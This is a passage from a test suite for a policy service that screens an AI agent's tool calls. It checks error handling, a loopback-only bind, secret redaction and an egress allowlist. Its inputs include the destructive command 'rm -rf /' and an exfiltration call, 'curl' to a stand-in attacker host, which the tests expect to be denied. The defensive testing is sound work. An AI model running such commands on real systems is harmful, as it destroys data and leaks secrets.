      // its schema path and the root it strips one level shallower than the
      // real source -- see withSchemalessGuardian's doc comment -- so the
      // remainder reads the same as it would from the real source. The
      // absolute prefix is gone either way, which is the assertion above.)
      expect(message).toContain("specification/v0.1.0");
    });
  });

  // This rethrow route bypasses denyOnInvalidEnvelope entirely: it only runs
  // when validateEnvelope throws its own typed EnvelopeValidationError (a
  // real schema mismatch). The ENOENT withSchemalessGuardian forces here is
  // a Guardian bug -- a missing schema directory, not an invalid envelope --
  // so dispatch's `instanceof EnvelopeValidationError` check is false and it
  // rethrows unconditionally, landing in handleAcsRequest's outer net,
  // which stays a bare JSON-RPC error.
  it("carries no decision -- this rethrow bypasses denyOnInvalidEnvelope, since a missing schema directory is a Guardian bug, not an invalid envelope", async () => {
    await withSchemalessGuardian(async ({ url }) => {
      const response = await postAcs(url, toolCallEnvelope("rm -rf /"));

      expect(response.result).toBeUndefined();
      expect((response as Record<string, unknown>).decision).toBeUndefined();
      expect(JSON.stringify(response)).not.toContain("deny");
    });
  });

  it("records both the request and the response, so the envelope log has no unrecorded exit", async () => {
    await withSchemalessGuardian(async ({ url, logPath, close }) => {
      await postAcs(url, toolCallEnvelope("ls -la", { id: 11 }));

      await close();
      const lines = readFileSync(logPath, "utf8").trim().split("\n");
      const entries = lines.map((line) => JSON.parse(line) as { direction: string; rpc_id: unknown });
      expect(entries.map((e) => e.direction)).toEqual(["request", "response"]);
      // Paired by JSON-RPC id, which is what lets the Inspector show the
      // failure beside the request that caused it.
      expect(entries.map((e) => e.rpc_id)).toEqual([11, 11]);
    });
  });

  // `instanceof Error` does not guarantee `.message` is a string -- true of
  // the real ENOENT the test above forces, but not something
  // toRepoRelativeMessage can assume in general. An Error whose `.message`
  // has been overwritten to `undefined` would throw `TypeError: undefined
  // is not an object (evaluating 'message.replace')` out of the helper
  // itself if it made that assumption -- and unlike the inner catch's own
  // throw (contained by this outer catch), a throw *from* the outer catch
  // has nothing above `handleAcsRequest` to catch it: Bun.serve's fetch
  // handler has no try, so it would answer with the unrecorded HTML 500 the
  // module header exists to prevent.
  it("does not let a real Error with a non-string .message escape the outer catch as an HTML 500", async () => {
    await withFakeValidateEnvelopeGuardian(UNDEFINED_MESSAGE_SCRATCH_DIR, UNDEFINED_MESSAGE_VALIDATE_ENVELOPE_SOURCE, async ({ url }) => {
      const res = await fetch(url, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(toolCallEnvelope("ls -la", { id: 9 })),
      });

      const text = await res.text();
      expect(text.slice(0, 1)).toBe("{");
      const response = JSON.parse(text) as JsonRpcResponse;

      expect(response.jsonrpc).toBe("2.0");
      expect(response.id).toBe(9);
      expect(response.error).toBeDefined();
      expect(response.error?.code).toBeGreaterThanOrEqual(-32099);
      expect(response.error?.code).toBeLessThanOrEqual(-32000);
      // Total, coerced to text, rather than thrown.
      expect(response.error?.message).toContain("undefined");
    });
  });

  // An Error whose `.message` is an accessor that throws on get defeats
  // `error instanceof Error ? error.message : error` inside
  // toRepoRelativeMessage itself. Unreachable from any real throw site in
  // this repo today -- belt and braces, not a reaction to a live bug (see
  // toRepoRelativeMessage's doc comment) -- but the unit assertions in the
  // describe block below only prove the helper itself is total; this
  // proves the outer net around it still holds when the value it's handed
  // is this pathological. (A getPrototypeOf-trapping Proxy is covered at
  // the unit level only, not here -- see
  // THROWING_MESSAGE_ACCESSOR_VALIDATE_ENVELOPE_SOURCE's doc comment for
  // why that one specifically cannot reach toRepoRelativeMessage unmutated
  // through dispatch's rethrow route.)
  it("does not let an Error with a throwing .message accessor escape the outer catch as an HTML 500 either", async () => {
    await withFakeValidateEnvelopeGuardian(
      THROWING_MESSAGE_ACCESSOR_SCRATCH_DIR,
      THROWING_MESSAGE_ACCESSOR_VALIDATE_ENVELOPE_SOURCE,
      async ({ url }) => {
        const res = await fetch(url, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify(toolCallEnvelope("ls -la", { id: 10 })),
        });

        const text = await res.text();
        expect(text.slice(0, 1)).toBe("{");
        const response = JSON.parse(text) as JsonRpcResponse;

        expect(response.jsonrpc).toBe("2.0");
        expect(response.id).toBe(10);
        expect(response.error).toBeDefined();
        expect(response.error?.code).toBeGreaterThanOrEqual(-32099);
        expect(response.error?.code).toBeLessThanOrEqual(-32000);
        expect(response.error?.message).toContain("<unprintable error>");
      },
    );
  });
});

describe("toRepoRelativeMessage", () => {
  // `instanceof Error` says nothing about what `.message` was reassigned to
  // after construction, so this function must not assume it is a string.
  // Exercised directly (rather than only through
  // withFakeValidateEnvelopeGuardian's HTTP round trip) so every shape of
  // `unknown` a catch clause can hand it is covered without standing up a
  // Guardian for each one.
  it("never throws, for an Error whose .message is not a string", () => {
    const undefinedMessage = new Error("erased below");
    (undefinedMessage as { message: unknown }).message = undefined;
    const numberMessage = new Error("erased below");
    (numberMessage as { message: unknown }).message = 42;
    const objectMessage = new Error("erased below");
    (objectMessage as { message: unknown }).message = { nested: true };

    expect(toRepoRelativeMessage(undefinedMessage)).toBe("undefined");
    expect(toRepoRelativeMessage(numberMessage)).toBe("42");
    expect(toRepoRelativeMessage(objectMessage)).toBe("[object Object]");
  });

  it("is total for non-Error unknown values too, matching what a catch clause can hand it", () => {
    expect(toRepoRelativeMessage("a plain string")).toBe("a plain string");
    expect(toRepoRelativeMessage(42)).toBe("42");
    expect(toRepoRelativeMessage(null)).toBe("null");
    expect(toRepoRelativeMessage(undefined)).toBe("undefined");
    expect(toRepoRelativeMessage({ some: "object" })).toBe("[object Object]");
  });

  // The contract this function exists to uphold is that nothing escapes the
  // outer net, and "unreachable today" should not be load-bearing for that
  // (see this function's doc comment). Four shapes, each defeating a
  // different step of `String(error instanceof Error ? error.message :
  // error)`:
  //   - an Error whose `.message` is a throwing accessor
  //   - a value whose `toString`/`valueOf` both throw, so `String()` itself
  //     throws on the non-Error branch
  //   - a Proxy that throws on `get` (String() needs to read
  //     Symbol.toPrimitive/toString/valueOf off it)
  //   - a Proxy that throws on `getPrototypeOf`, defeating `instanceof
  //     Error` before `String()` is ever reached at all
  it("never throws, even for values that defeat message access, stringification, or property/prototype traps", () => {
    const throwingAccessor = new Error("real message, about to be hidden behind a throwing getter");
    Object.defineProperty(throwingAccessor, "message", {
      get() {
        throw new Error("message getter blew up");
      },
    });

    const throwingToString = {
      toString() {
        throw new Error("toString blew up");
      },
      valueOf() {
        throw new Error("valueOf blew up");
      },
    };

    const throwingGetProxy = new Proxy(
      {},
      {
        get() {
          throw new Error("get trap blew up");
        },
      },
    );

    const throwingGetPrototypeOfProxy = new Proxy(
      {},
      {
        getPrototypeOf() {
          throw new Error("getPrototypeOf trap blew up");
        },
      },
    );

    expect(toRepoRelativeMessage(throwingAccessor)).toBe("<unprintable error>");
    expect(toRepoRelativeMessage(throwingToString)).toBe("<unprintable error>");
    expect(toRepoRelativeMessage(throwingGetProxy)).toBe("<unprintable error>");
    expect(toRepoRelativeMessage(throwingGetPrototypeOfProxy)).toBe("<unprintable error>");
  });

  // toRepoRelativeMessage strips the *repository* root -- two directories
  // above this tree, which sits at reference-implementations/agt -- not
  // this file's own REPO_ROOT. Bare, with no trailing separator, so these
  // tests can build "root + separator + subpath" and "root + suffix"
  // strings without accidentally doubling or misplacing a slash.
  const REPOSITORY_ROOT_BARE = fileURLToPath(new URL("../../../../../", import.meta.url)).replace(/[/\\]+$/, "");

  it("strips the repository's root, with or without a trailing separator", () => {
    expect(toRepoRelativeMessage(new Error(`${REPOSITORY_ROOT_BARE}/specification/v0.1.0`))).toBe(
      "specification/v0.1.0",
    );
    expect(toRepoRelativeMessage(new Error(REPOSITORY_ROOT_BARE))).toBe("");
  });

  // An un-anchored match on REPO_ROOT as a bare prefix would also strip a
  // *sibling* directory whose name merely extends the root (a `_old` backup
  // clone, say) -- not a disclosure of this tree's own location, since it
  // names a different directory entirely, but a misleading diagnostic that
  // would then read as if it were a path under this repo.
  it("leaves a sibling directory whose name extends the repo root untouched", () => {
    const siblingPath = `${REPOSITORY_ROOT_BARE}_old/specification`;

    expect(toRepoRelativeMessage(new Error(siblingPath))).toBe(siblingPath);
  });
});

// mapping.yaml's intervention_points table is what the conformance
// package's mapping table publishes -- not its coverage matrix, which
// measures. A declaration the runtime does not consult is a claim nobody
// checks, so this proves the runtime actually reads the table rather than
// hardcoding a point.
describe("startGuardian POST /acs -- the intervention point comes from mapping.yaml", () => {
  it("evaluates the point the table names, not pre_tool_call: a moved row changes the decision", async () => {
    // The fixture answers steps/toolCallRequest with `output`, which
    // policy/manifest.yaml does not register -- so honouring the table makes
    // AGT fail closed, while ignoring it would allow this benign command. The
    // two outcomes are opposite: this cannot pass against a hardcoded point.
    const guardian = await startGuardian({
      port: 0,
      manifestPath: "policy/manifest.yaml",
      mappingPath: "packages/guardian/test/fixtures/mapping.tool-call-at-a-different-point.yaml",
    });

    try {
      const response = await postAcs(guardian.url, toolCallEnvelope("ls -la"));

      expect(response.error).toBeUndefined();
      expect(response.result?.decision).toBe("deny");
      expect(response.result?.reason_codes).toEqual(["runtime_error:intervention_point_unknown"]);
    } finally {
      await guardian.close();
    }
  });
});

// PR #10 review, Critical: Bun.serve with no `hostname` binds `*` -- every
// interface, dual-stack -- and this endpoint has no auth, no origin check and
// no request signing, so every host that could route to the port was a policy
// oracle and a policy sink. The observable that separates the two binds is
// reachability, so that is what is asserted, rather than the label Bun prints
// for the socket (`server.hostname` reads "localhost" for a wildcard bind,
// which is exactly the reading that hid this).
describe("startGuardian binds loopback only", () => {
  async function reachable(url: string): Promise<boolean> {
    try {
      await fetch(url, { method: "POST", body: "{}", signal: AbortSignal.timeout(2000) });
      return true;
    } catch {
      return false;
    }
  }

  it("refuses a connection to ::1, which a wildcard bind accepts", async () => {
    // `hostname: "::"` reproduces the pre-fix bind exactly: dual-stack
    // wildcard, ::1 and 127.0.0.1 both answering. It is the control, and it
    // is what stops the assertion below from passing vacuously on a machine
    // with no IPv6 loopback -- there, this expectation fails first and says
    // so, rather than letting an unreachable address look like a narrow bind.
    const wildcard = await startGuardian({ port: 0, hostname: "::", manifestPath: "policy/manifest.yaml" });
    const loopback = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });

    try {
      // Path and port both come from the url the Guardian reported, so the
      // probe cannot drift from what it actually serves.
      const wildcardEndpoint = new URL(wildcard.url);
      const loopbackEndpoint = new URL(loopback.url);

      expect(await reachable(`http://[::1]:${wildcardEndpoint.port}${wildcardEndpoint.pathname}`)).toBe(true);
      expect(await reachable(`http://127.0.0.1:${loopbackEndpoint.port}${loopbackEndpoint.pathname}`)).toBe(true);
      expect(await reachable(`http://[::1]:${loopbackEndpoint.port}${loopbackEndpoint.pathname}`)).toBe(false);
    } finally {
      await wildcard.close();
      await loopback.close();
    }
  });
});
// The second ACS method's gate. Two gated branches, one predicate per
// assembler -- so this block asserts both directions and the fall-through. A
// dispatch driven by the resolved intervention point alone, or by a single
// predicate answering for both methods, passes the first test here and fails
// the last two: mapping.yaml declares six methods with points and this
// Guardian assembles two, so a point-driven branch would hand a
// steps/sessionStart envelope to whichever assembler came first and answer
// with a verdict that looks perfectly well-formed while having evaluated the
// wrong policy against the wrong shape.
describe("startGuardian POST /acs -- the result gate (steps/toolCallResult)", () => {
  it("redacts a secret-bearing output, echoing request_id", async () => {
    const requestId = crypto.randomUUID();

    const response = await postAcs(url, resultEnvelope("TOKEN=ghp_ABCDEF123456", { requestId }));

    expect(response.error).toBeUndefined();
    expect(response.result?.decision).toBe("modify");
    // The stock redact rule's own reason, which only the post_tool_call point
    // produces: pre_tool_call has no redact rule, and the result snapshot
    // carries no args for its pattern check to read. So this reason_code is
    // the evidence that the point mapping.yaml names for this method is the
    // point that evaluated -- not the request gate's.
    expect(response.result?.reason_codes).toEqual(["redaction_applied"]);
    expect(response.result?.request_id).toBe(requestId);

    // Now that mapVerdict takes the intervention point, the redacted text
    // lands as an ACS redaction on the result payload's own path, not as
    // the request gate's parameter_overrides.
    //
    // This is the only test whose assertion spans both declarations that
    // have to agree about that path, and that is what it is for. policy/manifest.yaml
    // declares the leaf AGT rewrites ($.tool_result.outputs[0].value, its own
    // JSONPath over the snapshot); mapping.yaml declares the ACS pointer the
    // host applies the result to (/outputs/0/value). They address the same leaf
    // in two notations, and nothing in either file can check the other.
    //
    // Each half is separately covered; neither cover is the AGREEMENT. Both
    // measured by mutation rather than assumed:
    //   - Move mapping.yaml's into_path and mapVerdict's unit tests fail
    //     as well -- they pin that pointer against the real mapping file.
    //   - Move this manifest's policy_target and every mapVerdict unit test
    //     still passes: they never read the manifest. Three other tests do fail
    //     (test/redaction.test.ts's bundle pin and two
    //     assemblePostToolCallSnapshot tests), but all three assert AGT's raw
    //     verdict, so none of them can
    //     tell whether the ACS pointer still names the leaf AGT rewrote.
    // So this is the one test that can catch a disagreement which leaves each
    // file individually plausible, because every layer between them is real
    // here: real bridge, real pinned bundle, real manifest, real mapping, real
    // HTTP response. Without it a disagreement surfaces in a demo, where the
    // host redacts the wrong element -- or nothing at all -- while the decision
    // still reports a rewrite.
    expect(response.result?.modifications).toEqual({
      redactions: [{ path: "/outputs/0/value", replacement: "TOKEN=[REDACTED]" }],
    });

    // §6.3's oneOf, asserted on the wire rather than in a unit test, plus the
    // array shape. The array is not a restatement of the literal above: an
    // object keyed "0" fails CLOSED at the host, where applyModifications'
    // non-array guard throws ModificationsInvalidError and validateDecision
    // answers `deny` (see `applyModifications` in
    // packages/host-adapter/src/modifications.ts, covered by
    // validate-decision.test.ts and measured again for the object-keyed form
    // specifically). So the wrong shape does NOT reach a host that applies
    // nothing while reporting a rewrite -- that fail-open is already closed one
    // hop later. What pinning it here buys is catching the wrong shape AT THE
    // SOURCE, as a Guardian bug, instead of as a refused rewrite whose deny a
    // reader then has to trace back across the wire.
    //
    // Neither mutation described above isolates these lines. Moving
    // mapping.yaml's into_path fails mapVerdict's unit tests too, so it
    // shows nothing this test adds; moving the manifest's policy_target fails
    // this test at the `decision === "modify"` assertion, which predates it.
    // The mutation that isolates them: hardcode "pre_tool_call" into
    // server.ts's mapVerdict call while still evaluating the RESOLVED point.
    // The suite goes 457 pass / 1 fail with the literal above the only failure
    // -- the result gate answers a result payload with
    // `parameter_overrides: {command: "TOKEN=[REDACTED]"}` while `decision`,
    // `reason_codes` and `request_id` all stay perfect. A rewrite reported
    // against a key the payload does not have, and nothing else in 459 tests
    // notices. That is what these assertions are for.
    const mods = response.result?.modifications as Record<string, unknown>;
    expect(Array.isArray(mods.redactions)).toBe(true);
    expect("parameter_overrides" in mods).toBe(false);
    expect("modified_content" in mods).toBe(false);
  });

  it("leaves an output with nothing to redact a clean allow", async () => {
    const requestId = crypto.randomUUID();

    const response = await postAcs(url, resultEnvelope("hello world", { requestId }));

    expect(response.error).toBeUndefined();
    expect(response.result?.decision).toBe("allow");
    expect(response.result?.request_id).toBe(requestId);
    // §6.3 attaches modifications to `modify` and to nothing else, so an allow
    // carrying them is a violation -- and one with a live fail-open on the
    // other side of it, since the host adapter reads `modifications` off a
    // decision it was told to honour. The neighbouring test pins that a real
    // redaction DOES carry them, so this pins the other direction from the
    // same live Guardian: only the value that matched a pattern gets a rewrite
    // attached to it.
    expect(response.result?.modifications).toBeUndefined();
  });

  // Direction two: the request gate still answers request envelopes, with the
  // pre-tool rule's own reason. If the result branch (or one merged branch)
  // took this envelope, assembling a result snapshot from a payload with no
  // `outputs` would throw and the reason_code would be "evaluation_failed"
  // instead -- an honoured deny, and a passing-looking response.
  it("still answers a request envelope from the pre-tool branch, with the pre-tool rule's own reason", async () => {
    const response = await postAcs(url, toolCallEnvelope("rm -rf /"));

    expect(response.error).toBeUndefined();
    expect(response.result?.decision).toBe("deny");
    expect(response.result?.reason_codes).toEqual(["destructive_shell_command_blocked"]);
  });

  // The fall-through, unchanged: a method this Guardian cannot assemble a
  // snapshot for must not be answered with a snapshot it can. This is the
  // assertion that fails if the two predicates are ever replaced by a method
  // switch or by a branch keyed on the resolved point.
  it("still answers steps/sessionStart with method-not-dispatched, from neither branch", async () => {
    const response = await postAcs(url, makeEnvelope("steps/sessionStart", {}, { id: 7 }));

    expect(response.result).toBeUndefined();
    expect(response.id).toBe(7);
    expect(response.error?.code).toBe(-32011);
    expect(response.error?.data).toEqual({ method: "steps/sessionStart" });
  });
});

// Validation, the chain, and snapshot assembly, end to end: the chain grows
// on arrival, a denied step still lands in it, and the labels one verdict
// returns reach the next step's snapshot. `recordingBridge` stands in
// wherever a controlled `result_labels` or a captured snapshot is the point
// of the test: the stock IFC gate is on and real verdicts do carry
// `result_labels`, but AGT propagates the labels it is handed and originates
// none, so a real bridge could only return `["public"]` to a session already
// seeded at `["public"]` -- a carried label and an untouched one would be
// the same assertion.
//
// session_id and request_id are generated UUIDs throughout:
// request-envelope.json pins `format: "uuid"` on both (Metadata.session_id,
// AcsParams.request_id), so a literal like "sess-a" fails schema validation
// before evaluateStep is ever reached -- envelope_invalid, not the behaviour
// these tests exist to pin. Measured directly: posting a literal
// session_id/request_id through a real startGuardian answers
// `{decision: "deny", reason_codes: ["envelope_invalid"]}` and leaves the
// chain empty.
describe("session state end to end", () => {
  it("grows the chain by one entry per governed step, on one session", async () => {
    const store = createMemorySessionContextStore();
    const guardian = await startGuardian({ ...baseOptions, sessionContextStore: store });
    const sessionId = crypto.randomUUID();
    const requestId1 = crypto.randomUUID();
    const requestId2 = crypto.randomUUID();
    try {
      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId1 }));
      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId2 }));
      const chain = loadSessionContext(store, sessionId).entries;
      expect(chain.map((e) => e.seq)).toEqual([1, 2]);
      expect(chain[1]!.prev_hash).toBe(chain[0]!.hash);
      expect(chain.map((e) => e.request_id)).toEqual([requestId1, requestId2]);
    } finally {
      await guardian.close();
    }
  });

  it("appends the step even when the decision denies it", async () => {
    const store = createMemorySessionContextStore();
    const guardian = await startGuardian({ ...baseOptions, sessionContextStore: store });
    const sessionId = crypto.randomUUID();
    try {
      const response = await postStep(guardian, toolCallRequest({ session_id: sessionId, command: "rm -rf /" }));
      expect(response.result?.decision).toBe("deny");
      expect(loadSessionContext(store, sessionId).entries).toHaveLength(1);
    } finally {
      await guardian.close();
    }
  });

  it("hands the snapshot the labels the previous step's verdict returned", async () => {
    const store = createMemorySessionContextStore();
    const seen: unknown[] = [];
    const bridge = recordingBridge(seen, { decision: "allow", result_labels: ["confidential"] });
    const guardian = await startGuardian({ ...baseOptions, bridge, sessionContextStore: store });
    const sessionId = crypto.randomUUID();
    try {
      await postStep(guardian, toolCallRequest({ session_id: sessionId }));
      await postStep(guardian, toolCallRequest({ session_id: sessionId }));
    } finally {
      await guardian.close();
    }
    const first = seen[0] as { input: { ifc: { source_labels: string[] } } };
    const second = seen[1] as { input: { ifc: { source_labels: string[] } } };
    // The lattice floor, not `[]` -- the first step's snapshot carries this
    // session's seed, since nothing has persisted a verdict's labels yet.
    expect(first.input.ifc.source_labels).toEqual(["public"]);
    expect(second.input.ifc.source_labels).toEqual(["confidential"]);
  });

  it("keeps two sessions' labels and chains apart", async () => {
    const store = createMemorySessionContextStore();
    const seen: unknown[] = [];
    const bridge = recordingBridge(seen, { decision: "allow", result_labels: ["secret"] });
    const guardian = await startGuardian({ ...baseOptions, bridge, sessionContextStore: store });
    const sessionA = crypto.randomUUID();
    const sessionB = crypto.randomUUID();
    try {
      await postStep(guardian, toolCallRequest({ session_id: sessionA }));
      // Two-sided: session A got what the verdict returned, session B (never
      // posted to) got neither the labels nor a chain entry. Asserting only
      // B's emptiness would still pass if persistIfcLabels were deleted
      // entirely -- there would be nothing anywhere to tell A and B apart.
      expect(supplySourceLabels(store, sessionA)).toEqual(["secret"]);
      expect(loadSessionContext(store, sessionA).entries).toHaveLength(1);
      // The lattice floor, not `[]` -- session B was never posted to, so it
      // reads back its seed rather than an empty set.
      expect(supplySourceLabels(store, sessionB)).toEqual(["public"]);
      expect(loadSessionContext(store, sessionB).entries).toEqual([]);
    } finally {
      await guardian.close();
    }
  });

  it("writes one JSONL line per entry when given a log path", async () => {
    const path = join(tmpdir(), `acs-session-${crypto.randomUUID()}.jsonl`);
    const guardian = await startGuardian({ ...baseOptions, sessionContextLog: path });
    const sessionId = crypto.randomUUID();
    const requestId1 = crypto.randomUUID();
    const requestId2 = crypto.randomUUID();
    try {
      // Two steps, not one: a sink that (wrongly) wrote only the first entry
      // ever appended would still pass a single-post version of this test.
      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId1 }));
      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId2 }));
      await guardian.close();
      const lines = readFileSync(path, "utf8").trim().split("\n");
      expect(lines).toHaveLength(2);
      expect(JSON.parse(lines[0]!)).toMatchObject({ session_id: sessionId, seq: 1, request_id: requestId1 });
      expect(JSON.parse(lines[1]!)).toMatchObject({ session_id: sessionId, seq: 2, request_id: requestId2 });
    } finally {
      await guardian.close();
      rmSync(path, { force: true });
    }
  });

  // If the projection write used raw appendFileSync/mkdirSync with no guard,
  // a filesystem failure on the (optional, Inspector-only) session-context
  // log would throw inside evaluateStep's try -- landing in the same catch
  // AGT's own evaluation failures use, and coming back as an honoured deny
  // with reason_codes: ["evaluation_failed"]. Every governed step would then
  // be denied by a broken projection file, blamed on policy evaluation.
  // `sessionContextLog` names a path whose parent component is a plain file,
  // not a directory, so `mkdirSync(dirname(path), {recursive: true})` is
  // asked to create a directory where an existing plain file already sits and
  // throws EEXIST. Measured: the run captured in the v6 runbook of the
  // standalone repository (github.com/afogel/ACS_reference_implementation,
  // docs/demos/v6-runbook.md) prints this test's own disable notice as `EEXIST: file already exists,
  // mkdir '<the blocker file>'`. (ENOTDIR is the errno for a path beneath a
  // plain file, which this is not: `dirname` is the blocker itself.)
  it("does not let a failing session-context log turn a governed tool call into a denied one", async () => {
    const blocker = join(GUARDIAN_PKG, `tmp-session-log-blocker-${crypto.randomUUID()}.txt`);
    writeFileSync(blocker, "not a directory");
    const badLogPath = join(blocker, "session-context.jsonl");
    const guardian = await startGuardian({ ...baseOptions, sessionContextLog: badLogPath });
    try {
      const response = await postStep(guardian, toolCallRequest());
      expect(response.error).toBeUndefined();
      expect(response.result?.decision).toBe("allow");
      expect(response.result?.reason_codes).not.toEqual(["evaluation_failed"]);
    } finally {
      await guardian.close();
      unlinkSync(blocker);
    }
  });
});

describe("a redaction lands on the argument the tool actually sent", () => {
  // The host in this URL is load-bearing, and not for the redaction. AGT ranks
  // an egress deny ABOVE a redact transform, so this case only reaches the
  // redact rule because `docs.anthropic.com` matches an allowlist entry in
  // policy/lib/data.json (`*.anthropic.com`). Narrow or remove that entry and
  // this test stops asserting a redaction and starts reporting an
  // egress_destination_not_allowed deny -- which is correct behaviour and a
  // confusing failure, so it is written down here rather than rediscovered.
  it("rewrites the fetch's url, and names no argument the tool does not have", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "WebFetch", {
        url: "https://docs.anthropic.com/?t=ghp_ABCDEF123456",
      });
      expect(decision.decision).toBe("modify");
      expect(decision.modifications).toEqual({
        parameter_overrides: { url: "https://docs.anthropic.com/?t=[REDACTED]" },
      });
      expect(Object.keys(decision.modifications?.parameter_overrides ?? {})).not.toContain("command");
    } finally {
      await guardian.close();
    }
  });

  it("still rewrites a shell command's own argument, from the same declaration", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "Bash", { command: "echo ghp_ABCDEF123456" });
      expect(decision.modifications).toEqual({ parameter_overrides: { command: "echo [REDACTED]" } });
    } finally {
      await guardian.close();
    }
  });
});

describe("the annotator the shipped manifest declares", () => {
  // The origin, not the matched text: for an authority no parser could read
  // two ways, the annotator hands the gate a parsed origin, so a query or a
  // fragment cannot stand in for the host. Authorities that are not that
  // unambiguous get a destination that cannot resolve instead -- see that
  // module's own suite. This test is here to prove the routing, and it carries
  // the destination shape too, so a change to either is visible in both suites.
  it("routes the egress annotator by name", () => {
    expect(
      dispatchGuardianAnnotator("egress", {}, { snapshot: { tool_call: { args: {}, raw_command: "curl https://exfil.test/x" } } }),
    ).toEqual({ destination: "https://exfil.test" });
  });

  // A manifest naming an annotator this Guardian has nothing for is a
  // deployment fault, and AGT turns the throw into a deny on every call --
  // which is exactly right, because it is wrong on every call. Answering an
  // empty annotation instead would run the deployment silently unannotated.
  it("refuses a name it has no annotator for, rather than answering nothing", () => {
    expect(() => dispatchGuardianAnnotator("drift_score", {}, {})).toThrow(/drift_score/);
  });
});

// THE ONE CHECK IN THIS SLICE WHOSE ABSENCE WOULD BE SILENT. A manifest
// declaring an annotator the Guardian dispatches nothing for denies every
// call, benign ones included, with a runtime-error reason that reads like a
// policy decision -- measured. Nothing else here would catch that: every
// deny-side test in this slice would still pass.
describe("a benign call under the shipped manifest and the shipped annotator", () => {
  it("is not denied", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" });
      expect(decision.decision).toBe("allow");
      expect(decision.reason_codes ?? []).not.toContain("runtime_error:annotation_failed");
    } finally {
      await guardian.close();
    }
  });
});

describe("AGT's stock egress gate, driven from configuration", () => {
  it("denies a fetch of a host the allowlist does not cover", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "WebFetch", { url: "https://exfil.attacker.test/steal" });
      expect(decision.decision).toBe("deny");
      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
    } finally {
      await guardian.close();
    }
  });

  it("allows a fetch the allowlist covers", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      expect((await postToolCallRequest(guardian, "WebFetch", { url: "https://docs.anthropic.com/x" })).decision).toBe("allow");
    } finally {
      await guardian.close();
    }
  });

  it("denies a shell command reaching the same host, from a destination the Guardian extracted", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(
        guardian,
        "Bash",
        { command: "curl https://exfil.attacker.test/steal" },
        { raw_command: "curl https://exfil.attacker.test/steal" },
      );
      expect(decision.decision).toBe("deny");
      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
    } finally {
      await guardian.close();
    }
  });

  // No false positive in either direction, which is what makes a SHARED
  // policy-target leaf safe: the destructive-shell patterns do not match URLs,
  // and the egress gate does not match commands.
  it("still denies a destructive shell command on its own gate, not on this one", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "Bash", { command: "rm -rf /" }, { raw_command: "rm -rf /" });
      expect(decision.reason_codes).toEqual(["destructive_shell_command_blocked"]);
    } finally {
      await guardian.close();
    }
  });

  it("allows a shell command reaching a host the allowlist covers", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(
        guardian,
        "Bash",
        { command: "curl https://docs.anthropic.com/x" },
        { raw_command: "curl https://docs.anthropic.com/x" },
      );
      expect(decision.decision).toBe("allow");
    } finally {
      await guardian.close();
    }
  });

  // The stated miss direction, at the level a demo viewer sees it: a command
  // the extractor cannot parse is unexamined, not denied.
  it("allows a command it can find no destination in, rather than denying what it cannot read", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      expect(
        (await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" })).decision,
      ).toBe("allow");
    } finally {
      await guardian.close();
    }
  });
});

// policy/manifest.drift.yaml had NOTHING holding it: no code in this tree
// builds a bridge or a Guardian on it, and its only invocation is a code block
// inside a runbook, which is documentation and never executed. So the property
// below -- the one its policy_target and its annotation `from` were moved onto
// the normalised leaf for -- was backed by nothing the suite could detect, in
// either direction, and a regression would have surfaced as a total deny in a
// live demo rather than as a red test.
//
// Measured, by pointing that manifest's two paths back at
// "$.tool_call.args.command" and evaluating this same shape: deny,
// runtime_error:path_missing, before any rule ran. The tool here is registered
// in that manifest and sends no `command` at all, which is the whole point --
// against a target naming one tool's own argument, that is a total deny for
// every call by every tool shaped like it.
describe("the drift demo's manifest, on a tool that sends no command", () => {
  it("resolves its policy target and its annotation, rather than denying the call before any rule runs", async () => {
    const guardian = await startGuardian({
      port: 0,
      manifestPath: "policy/manifest.drift.yaml",
      // The constant-score stub the v3 runbook of the standalone repository
      // (github.com/afogel/ACS_reference_implementation, docs/demos/v3-runbook.md) runs the demo with.
      // AGT's design puts behaviour-drift detection outside the policy engine,
      // so a fixed score makes the wiring visible without building a detector.
      annotator: () => 0.9,
    });
    try {
      const decision = await postToolCallRequest(guardian, "WebFetch", { url: "https://docs.anthropic.com/x" });

      expect(decision.reason_codes ?? []).not.toContain("runtime_error:path_missing");
      // Not vacuous: every way this manifest can fail a call it cannot resolve
      // -- path_missing, tool_unknown, annotation_failed -- arrives as a deny,
      // so a decision of "allow" is what says the call was actually evaluated.
      expect(decision.decision).toBe("allow");
    } finally {
      await guardian.close();
    }
  });
});
